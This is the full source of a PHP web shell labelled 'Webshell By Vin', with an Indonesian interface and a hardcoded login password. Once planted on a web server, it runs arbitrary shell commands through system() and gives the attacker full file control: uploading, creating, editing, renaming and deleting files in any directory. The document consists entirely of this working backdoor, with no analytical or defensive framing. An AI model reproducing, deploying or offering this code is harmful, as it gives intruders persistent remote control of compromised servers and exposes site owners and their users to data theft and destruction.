<?php
session_start();
$password = "@admin_gacor1";
if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: ?");
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Webshell By Vin</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-dark d-flex justify-content-center align-items-center vh-100 text-light">
        <form method="post" class="bg-secondary p-4 rounded shadow">
            <h3 class="mb-3">Login Webshell By Vin</h3>
            <input type="password" name="pass" class="form-control mb-3" placeholder="Password">
            <button class="btn btn-light w-100">Login</button>
        </form>
    </body>
    </html>
    <?php exit;
}

$cwd = getcwd();
$dir = isset($_GET['d']) ? $_GET['d'] : $cwd;
chdir($dir);
$files = scandir(".");
$writable = is_writable($dir);

function perms($f) {
    $perm = fileperms($f);
    $out = '';
    if (is_dir($f)) $out .= 'd'; else $out .= '-';
    $m = ['r','w','x'];
    for ($i = 0; $i < 3; $i++) {
        for ($j = 2; $j >= 0; $j--) {
            $out .= ($perm & (1 << ($i * 3 + $j))) ? $m[2 - $j] : '-';
        }
    }
    return $out;
}

function encode($s) {
    return htmlspecialchars($s, ENT_QUOTES);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Webshell By Vin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-light">
<div class="container py-4">
    <h4 class="mb-4">Webshell By Vin @ <?php echo encode(getcwd()); ?></h4>

    <!-- Command -->
    <form method="post" class="mb-3">
        <div class="input-group">
            <input type="text" name="cmd" class="form-control" placeholder="Ketik perintah...">
            <button class="btn btn-light">Jalankan</button>
        </div>
    </form>
    <?php
    if (isset($_POST['cmd'])) {
        echo "<pre class='bg-black p-2 text-success'>";
        if (strpos(ini_get('disable_functions'), 'system') === false) {
            system($_POST['cmd']);
        } else {
            echo "Fungsi system dinonaktifkan.";
        }
        echo "</pre>";
    }
    ?>

    <!-- Upload -->
    <?php if ($writable): ?>
        <form method="post" enctype="multipart/form-data" class="mb-3">
            <div class="row g-2">
                <div class="col"><input type="file" name="upload" class="form-control"></div>
                <div class="col-auto"><button class="btn btn-light">Upload</button></div>
            </div>
        </form>
    <?php else: ?>
        <div class="alert alert-danger">Folder tidak bisa dimodifikasi (akses ditolak).</div>
    <?php endif; ?>
    <?php
    if ($writable && isset($_FILES['upload'])) {
        move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
        echo "<div class='alert alert-success'>Upload sukses!</div>";
    }
    ?>

    <!-- New File / Folder -->
    <?php if ($writable): ?>
        <form method="post" class="row g-2 mb-3">
            <div class="col">
                <input type="text" name="newfile" class="form-control" placeholder="Nama file baru">
            </div>
            <div class="col-auto"><button class="btn btn-outline-light" name="addfile">Tambah File</button></div>
        </form>
        <form method="post" class="row g-2 mb-4">
            <div class="col">
                <input type="text" name="newfolder" class="form-control" placeholder="Nama folder baru">
            </div>
            <div class="col-auto"><button class="btn btn-outline-light" name="addfolder">Tambah Folder</button></div>
        </form>
    <?php endif; ?>
    <?php
    if ($writable && isset($_POST['addfile']) && $_POST['newfile']) {
        file_put_contents($_POST['newfile'], '');
        echo "<script>location='?d=" . urlencode($dir) . "'</script>";
    }
    if ($writable && isset($_POST['addfolder']) && $_POST['newfolder']) {
        mkdir($_POST['newfolder']);
        echo "<script>location='?d=" . urlencode($dir) . "'</script>";
    }
    ?>

    <!-- File Viewer / Editor -->
    <?php if (isset($_GET['edit']) && is_file($_GET['edit'])):
        $editable = is_writable($_GET['edit']);
        ?>
        <?php if ($editable): ?>
            <form method="post">
                <input type="hidden" name="filename" value="<?php echo encode($_GET['edit']); ?>">
                <input type="hidden" name="d" value="<?php echo encode($dir); ?>">
                <label>Edit: <?php echo encode($_GET['edit']); ?></label>
                <textarea name="content" class="form-control" rows="15"><?php echo encode(file_get_contents($_GET['edit'])); ?></textarea>
                <button class="btn btn-light mt-2">Simpan</button>
            </form>
        <?php else: ?>
            <div class="alert alert-danger">File ini tidak bisa diedit (akses ditolak).</div>
        <?php endif; ?>
        <?php
        if ($editable && isset($_POST['content'], $_POST['filename'])) {
            file_put_contents($_POST['filename'], $_POST['content']);
            echo "<script>location='?d=" . urlencode($dir) . "'</script>";
        }
        ?>
    <?php endif; ?>

    <!-- File List -->
    <table class="table table-dark table-bordered table-hover">
        <thead>
        <tr>
            <th>Nama</th><th>Ukuran</th><th>Permission</th><th>Aksi</th>
        </tr>
        </thead>
        <tbody>
        <?php foreach ($files as $file):
            if ($file === ".") continue;
            $path = "$dir/$file";
            $real = realpath($path);
            $webPath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $real);
            $isWritable = is_writable($file);
            $class = $isWritable ? "" : "text-danger fw-bold";
            ?>
            <tr>
                <td class="<?php echo $class; ?>">
                    <?php if (is_dir($file)): ?>
                        <a class="<?php echo $class; ?>" href="?d=<?php echo urlencode($real); ?>"><?php echo $file; ?></a>
                    <?php else: ?>
                        <?php echo $file; ?>
                    <?php endif; ?>
                </td>
                <td><?php echo is_file($file) ? filesize($file) . " B" : "-"; ?></td>
                <td><?php echo perms($file); ?></td>
                <td class="d-flex gap-1 flex-wrap">
                    <?php if (is_file($file)): ?>
                        <a class="btn btn-sm btn-outline-info" href="?d=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($file); ?>">Edit</a>
                        <a class="btn btn-sm btn-outline-success" target="_blank" href="<?php echo 'http://' . $_SERVER['HTTP_HOST'] . $webPath; ?>">Live</a>
                    <?php endif; ?>
                    <?php if ($isWritable): ?>
                        <a class="btn btn-sm btn-outline-warning" href="?d=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($file); ?>">Rename</a>
                        <a class="btn btn-sm btn-outline-danger" href="?d=<?php echo urlencode($dir); ?>&del=<?php echo urlencode($file); ?>" onclick="return confirm('Yakin hapus?')">Hapus</a>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>

    <!-- Rename -->
    <?php if (isset($_GET['rename']) && is_writable($_GET['rename'])): ?>
        <form method="post">
            <input type="hidden" name="oldname" value="<?php echo encode($_GET['rename']); ?>">
            <input type="hidden" name="d" value="<?php echo encode($dir); ?>">
            <div class="input-group">
                <input type="text" name="newname" class="form-control" placeholder="Nama baru" required>
                <button class="btn btn-light">Rename</button>
            </div>
        </form>
    <?php endif; ?>
    <?php
    if (isset($_GET['del']) && is_writable($_GET['del'])) {
        unlink($_GET['del']) || rmdir($_GET['del']);
        echo "<script>location='?d=" . urlencode($dir) . "'</script>";
    }
    if (isset($_POST['oldname'], $_POST['newname'])) {
        rename($_POST['oldname'], $_POST['newname']);
        echo "<script>location='?d=" . urlencode($_POST['d']) . "'</script>";
    }
    ?>
</div>
</body>
</html>
